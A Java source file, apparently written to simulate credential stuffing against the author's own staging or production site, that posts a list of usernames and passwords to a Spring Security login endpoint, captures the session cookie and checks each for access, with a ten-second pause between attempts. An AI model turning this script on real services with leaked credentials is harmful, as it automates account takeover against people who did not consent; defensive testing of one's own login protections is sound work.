package com.largepixels.webscrapeexamples.credential_stuffing;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpCookie;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

/**
 * Created by johnminchuk on 5/1/17.
 */
public class SimulateCredentialAttack {

    //prd
    //String[] usernames = {"user1","user2","user3","user4","user5","user6","user7","user8","user9","user10"};
    //String[] passwords = {"password", "password", "nogood", "password", "password", "nogood", "password", "password", "password", "password"};
    //String endpointPrefix = "www";

    //stg
    String[] usernames = {"user55","user56","user57","user58","user59","user60","user61","user62","user63","user64"};
    String[] passwords = {"password", "password", "nogood", "password", "password", "nogood", "password", "password", "password", "password"};
    String endpointPrefix = "www";

    private void runMe() throws Exception {


        for (int i = 0; i < usernames.length; i++) {
            System.out.println(usernames[i] + " : " + passwords[i]);

            String authToken = getAuthToken(usernames[i], passwords[i]);

            boolean canAccessSite = canAccessSite(authToken);

            if (canAccessSite) {
                System.out.println("I have verified I can access the site with user: " + usernames[i]);
            }
            else {
                System.out.println("I have verified I can NOT access the site with user: " + usernames[i]);
            }

            Thread.sleep(10000);    //ten seconds
        }

    }

    private boolean canAccessSite(String authToken) throws Exception {
        String url = "https://" + endpointPrefix + ".example.com/login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setInstanceFollowRedirects(false);

        String myCookie = "EXAMPLE_WD_WLJSESSIONID=" + authToken;
        con.setRequestProperty("Cookie", myCookie);

        con.connect();

        printTheRequest(con);

        return con.getResponseCode() == 200;

    }

    private String getAuthToken(String username, String password) throws Exception {

        String url = "https://" + endpointPrefix + ".example.com/j_spring_security_check";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setInstanceFollowRedirects(false);

        //add reuqest header
        con.setRequestMethod("POST");

        String urlParameters = "j_username=" + username + "&j_password=" + password;

        // Send post request
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();

        printTheRequest(con);

        String authToken = "";
        List<String> cookiesHeaders = con.getHeaderFields().get("Set-Cookie");
        for (String cookieHeader : cookiesHeaders) {
            HttpCookie cookie = HttpCookie.parse(cookieHeader).get(0);
            if ( cookie.getName().equals("EXAMPLE_WD_WLJSESSIONID") ) {
                authToken = cookie.getValue();
            }

        }

        return authToken;

    }

    private void printTheRequest(HttpURLConnection con) throws IOException {

        int responseCode = con.getResponseCode();
//        System.out.println("\nSending 'POST' request to URL : " + url);
//        System.out.println("Post parameters : " + urlParameters);
//        System.out.println("Response Code : " + responseCode);
//
//        System.out.println("Headers...");

        StringBuffer response = new StringBuffer();

        response.append(con.getResponseMessage() + "\n");

        Map<String, List<String>> map = con.getHeaderFields();
        for (Map.Entry<String, List<String>> entry : map.entrySet()) {
            response.append( entry.getKey() + entry.getValue() + "\n");
        }

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine + "\n");
        }
        in.close();

        //System.out.println(response.toString());

    }

    public static void main(String args[]) throws Exception {
        SimulateCredentialAttack simulateCredentialAttack = new SimulateCredentialAttack();
        simulateCredentialAttack.runMe();
    }

}
